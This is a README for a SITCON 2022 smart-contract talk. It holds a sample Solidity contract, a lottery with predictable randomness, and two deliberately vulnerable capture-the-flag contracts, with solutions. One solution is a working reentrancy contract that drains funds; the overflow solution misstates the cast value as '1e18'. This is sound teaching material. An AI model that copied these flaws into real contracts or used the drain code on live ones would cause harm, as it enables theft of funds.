# SITCON-2022-Solidity

Example smart contract and "Capture The Money" source code for SITCON 2022.

SITCON 2022 議程智慧合約原始碼。

---

# 別只會炒幣，來試著寫智慧合約吧！

[簡報連結](https://docs.google.com/presentation/d/1wmnUfG2DW-Tv8JeLZ4Te0hcKJI1tgrPry7LOAz3oRpA/edit?usp=sharing)

## Metamask 設定

| 網路名稱 | Polygon | Mumbai Testnet |
| --- | --- | --- |
| RPC URL | https://rpc-mainnet.maticvigil.com/ | https://rpc-mumbai.maticvigil.com/ |
| 鏈 ID | 137 | 80001 |
| Symbol | MATIC | TEST MATIC |
| 瀏覽器 | https://polygonscan.com/ | https://mumbai.polygonscan.com/ |

## 實用工具

- [Polygon主網水龍頭](https://matic.supply/)
- [Mumbai測試網水龍頭](https://faucet.polygon.technology/)
- [Polygon Gastracker](https://polygonscan.com/gastracker)
- [ETH單位換算](https://eth-converter.com/)

## 範例合約

### 合約地址（Mumbai Testnet）

[0x5C7d2aC6D04ecf1af6ef1946751ea12BF09588dF](https://mumbai.polygonscan.com/address/0x5c7d2ac6d04ecf1af6ef1946751ea12bf09588df)

### 原始碼

```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

contract SITCONX {

    address public owner;
    mapping (address => uint256) public catsBalances;

    constructor() {
        owner = msg.sender;
        catsBalances[address(this)] = 10000;
    }

    function getCatsBalances() public view returns (uint256) {
        return catsBalances[address(this)];
    }

    function restock(uint256 amount) public {
        require(msg.sender == owner, "You are not the owner QAQ");
        catsBalances[address(this)] += amount;
    }

    function purchase(uint256 amount) public payable {
        require(msg.value >= amount * 0.01 ether, "You must pay greater than 0.01 MATIC.");
        require(catsBalances[address(this)] >= amount, "Meow, I'm out of stock QQ.");
        catsBalances[address(this)] -= amount;
        catsBalances[msg.sender] += amount;
    }
}
```

### ABI

```json!
[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"catsBalances","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getCatsBalances","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"purchase","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"restock","outputs":[],"stateMutability":"nonpayable","type":"function"}]
```

## 主委加碼環節

**若您之前已接觸過合約開發、合約 CTF、或已經持有比獎金多的加密貨幣，請不要參加以下活動！**

**請注意**
- 以下給的都是在 Polygon 上的 MATIC，是可以轉到交易所換法幣的
- 請將 Metamask 網路切換至 Polygon
- 可先在 Remix 中測試
- 注意 Wei, Gwei, Ether 單位換算問題，可使用上面提供的換算工具
- 攻擊前請先確定獎金是否已經被領走了

---

### MATIC 空投表單（活動已結束）

~~[表單連結](https://forms.gle/k5ndJw2966Mw1rbo8)~~

---

### 樂透（活動結束）

#### 合約地址

~~[0x42Ef622f3f2f3dF0033fe1fC645E41199870cf29](https://polygonscan.com/address/0x42ef622f3f2f3df0033fe1fc645e41199870cf29)~~

#### 原始碼

```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

contract SITCON_Lottery {
    address payable public owner;
    address payable[] public players;
    address payable public winnerAddr;
    bool public status;

    constructor() {
        owner = payable(msg.sender);
        status = true;
    }

    function getWinnerAddress() public view returns (address payable) {
        return winnerAddr;
    }

    function getPrizePool() public view returns (uint) {
        return address(this).balance;
    }

    function getPlayers() public view returns (address payable[] memory) {
        return players;
    }

    function enter() public payable {
        require(status == true, "Game is over.");
        require(msg.value >= 0.001 ether, "You must pay greater than 0.001 MATIC!");
        players.push(payable(msg.sender));
    }

    function getRandomNumber() public view returns (uint) {
        return uint(keccak256(abi.encodePacked(owner, block.timestamp)));
    }

    function pickWinner() public onlyowner {
        uint index = getRandomNumber() % players.length;
        require(players[index] != owner, "Owner can't be the winner lol.");
        players[index].transfer(address(this).balance);
        winnerAddr = players[index];
        status = false;
    }

    function BOMB() public onlyowner {
        selfdestruct(owner);
    }

    modifier onlyowner() {
        require(msg.sender == owner, "Bad hacker, ur not the owner!");
        _;
    }
}
```

#### ABI

```json!
[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"BOMB","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"enter","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"getPlayers","outputs":[{"internalType":"addresspayable[]","name":"","type":"address[]"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getPrizePool","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getRandomNumber","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"getWinnerAddress","outputs":[{"internalType":"addresspayable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"addresspayable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"pickWinner","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"uint256","name":"","type":"uint256"}],"name":"players","outputs":[{"internalType":"addresspayable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"status","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"winnerAddr","outputs":[{"internalType":"addresspayable","name":"","type":"address"}],"stateMutability":"view","type":"function"}]
```

---

### Capture The Moeny 1（有人解出來了）

#### 合約地址

~~[0x0C9D134fdf53a31bAdb67E9023dFF36a692f273e](https://polygonscan.com/address/0x0c9d134fdf53a31badb67e9023dff36a692f273e)~~

#### 原始碼

```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

contract SITCON_CTM1 {
    mapping(address => int256) public playerPoints;
    uint256 public pointstoWin = 1e10;
    uint256 public prize;
    bool public status;
    address public winner;
    address payable public owner;

    constructor() {
        owner = payable(msg.sender);
        status = true;
    }

    function addPrize() payable public {
        require(status == true, "Game is over.");
        prize += msg.value;
    }

    function getPrizePool() public view returns (uint) {
        return address(this).balance;
    }

    function addPoints(int256 _a) public {
        require(status == true, "Game is over.");
        require(_a <= 10, "Only allow to add less then 10 points!");
        playerPoints[msg.sender] += _a;
    }

    function win() public {
        require(uint256(playerPoints[msg.sender]) >= pointstoWin, "Not yet.");
        winner = msg.sender;
        status = false;
        payable(msg.sender).transfer(address(this).balance);
    }

    function BOMB() public onlyowner {
        selfdestruct(owner);
    }

    modifier onlyowner() {
        require(msg.sender == owner, "Bad hacker, ur not the owner!");
        _;
    }
}
```

#### ABI

```json!
[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"BOMB","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"int256","name":"_a","type":"int256"}],"name":"addPoints","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"addPrize","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"getPrizePool","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"addresspayable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"playerPoints","outputs":[{"internalType":"int256","name":"","type":"int256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"pointstoWin","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"prize","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"status","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"win","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"winner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"}]
```

#### Hints

太簡單了，應該不需要吧www

#### 解答

絕對不可能真的加10億次點數啦，gas fee會炸開！
這題是很經典的溢位攻擊，第26行的`addPoint`函式可以接受輸入負數，
第33行`uint256(playerPoints[msg.sender]`轉換成uint的時候，若點數是負的，會underflow成一個很大的正數。
例如點數輸入`-1`，轉換成uint的時候就會變成uint256的最大值`1e18`，這樣就可以超過題目要求的`1e10`了！

---

### Capture The Money 2（有人解出來了）

#### 合約地址

~~[0x4556955270300C1969fAFc6bC141b5F61B4C35BE](https://polygonscan.com/address/0x4556955270300c1969fafc6bc141b5f61b4c35be)~~

#### 原始碼

```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

contract SITCON_CTM2 {
    mapping(address => uint256) public balances;
    address payable public owner;

    constructor() {
        owner = payable(msg.sender);
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "No money to withdraw.");

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send MATIC");

        balances[msg.sender] = 0;
    }

    function getPrizePool() public view returns (uint256) {
        return address(this).balance;
    }

    function BOMB() public onlyowner {
        selfdestruct(owner);
    }

    modifier onlyowner() {
        require(msg.sender == owner, "Bad hacker, ur not the owner!");
        _;
    }
}
```

#### ABI

```json!
[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"inputs":[],"name":"BOMB","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"","type":"address"}],"name":"balances","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"deposit","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[],"name":"getPrizePool","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"owner","outputs":[{"internalType":"addresspayable","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"withdraw","outputs":[],"stateMutability":"nonpayable","type":"function"}]
```

#### Hints

- **這題的漏洞類型在簡報中有提過喔**

#### 解答

這題是很經典的fallback攻擊。
可以先存一筆錢進去再領出來，因為`withdraw`函式設計的瑕疵，提領時會先轉帳出去（第20行）再將使用者餘額歸零（第23行）。
所以可以在另個合約（假設叫Attack）寫一個fallback function，等Attack接收到CTM2轉來的錢，再fallback回去提領，因為一直沒有執行到CTM2第23行的`balances[msg.sender] = 0;`，所以就可以重複提領直到合約的錢被抽乾為止。
另外這題要注意的是，因為獎金有16MATIC，如果Attack每次只fallback提領1MATIC，表示迴圈要進行16次，可能會超過區塊的gas limit。所以建議一開始先存2MATIC，這樣就只要跑8次迴圈，可以大幅減少gas fee，這也是獎金設計成偶數的原因。

#### 攻擊合約範例

```solidity=
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

contract SITCON_CTM2 {
    mapping(address => uint256) public balances;
    address payable public owner;

    constructor() {
        owner = payable(msg.sender);
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 bal = balances[msg.sender];
        require(bal > 0, "No money to withdraw.");

        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send MATIC");

        balances[msg.sender] = 0;
    }

    function getPrizePool() public view returns (uint256) {
        return address(this).balance;
    }

    function BOMB() public onlyowner {
        selfdestruct(owner);
    }

    modifier onlyowner() {
        require(msg.sender == owner, "Bad hacker, ur not the owner!");
        _;
    }
}

contract Attack {
    SITCON_CTM2 public ctm;
    address payable public attacker;

    constructor(address _ctmAddress) {
        ctm = SITCON_CTM2(_ctmAddress);
        attacker = payable(msg.sender);
    }

    receive() external payable {
        if (address(ctm).balance >= 1 ether) {
            ctm.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether);
        ctm.deposit{value: msg.value}();
        ctm.withdraw();
    }

    function collectEther() public {
        require(msg.sender == attacker, "Don't even think of taking my prize.");
        payable(msg.sender).transfer(address(this).balance);
    }
}
```

---

## 學習資源

### Solidity

-   [CryptoZombies：遊戲化的 Solidity 學習平台](https://cryptozombies.io/)
-   [Solidity by Example](https://solidity-by-example.org/)
-   [Ethereum Blockchain Developer Guide](https://ethereum-blockchain-developer.com/000-learn-ethereum/)
-   Youtube 影片...

### 合約 CTF

-   [Security Innovation Blockchain CTF](https://blockchain-ctf.securityinnovation.com/)
-   [Capture the Ether](https://capturetheether.com/)
-   [Ethernaut](https://ethernaut.openzeppelin.com/)
